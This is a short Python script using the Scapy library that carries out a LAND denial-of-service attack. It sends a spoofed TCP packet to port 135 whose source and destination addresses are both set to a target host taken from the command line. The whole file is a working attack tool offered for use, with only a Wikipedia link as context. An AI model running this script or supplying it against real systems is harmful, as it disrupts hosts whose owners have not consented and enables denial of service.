from scapy.all import *
import sys

def land_attack():
    host = sys.argv[1]
    # https://en.wikipedia.org/wiki/Denial-of-service_attack
    send(IP(src=host, dst=host)/TCP(sport=135,dport=135))

if __name__ == "__main__":
    land_attack()
